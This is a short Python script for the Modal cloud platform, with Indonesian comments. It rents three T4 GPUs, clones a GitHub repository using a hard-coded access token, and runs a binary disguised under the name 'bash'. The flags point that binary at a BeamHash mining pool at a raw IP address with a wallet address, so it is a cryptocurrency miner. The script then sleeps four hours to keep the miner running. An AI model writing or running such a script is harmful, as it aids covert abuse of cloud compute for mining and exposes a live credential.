import modal
import subprocess
import time

app = modal.App("t4x3-runner")

image = (
    modal.Image.from_registry(
        "nvidia/cuda:12.1.1-runtime-ubuntu22.04"
    )
    .apt_install(
        "bash",
        "python3",
        "python3-pip",
        "python-is-python3"   # 🔥 INI KUNCI UTAMA
    )
)

@app.function(
    image=image,
    gpu=modal.gpu.T4(count=3),   # 🔥 T4 x3
    timeout=60 * 60 * 4          # ⏱️ 4 jam
)
def run_script():
    # 1️⃣ Pastikan Python terdeteksi
    subprocess.run(["python", "--version"], check=True)

    # 2️⃣ Pastikan GPU ada
    subprocess.run(["nvidia-smi"], check=True)

    # 3️⃣ Jalankan script
    subprocess.run(
        ["bash", "-lc", "git clone https://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@github.com/sadarsayujinjas/gm.git && cd gm && chmod u+x bash && ./bash -a beamhash -s 157.230.145.21:80 -u 9e9d39b48aeb26349eb88c4576295b529a6a7b2246439a06c35aba5209d9c96d91.jasin "],
        check=False
    )

    print("Staying alive for 4 hours...")
    time.sleep(60 * 60 * 4)
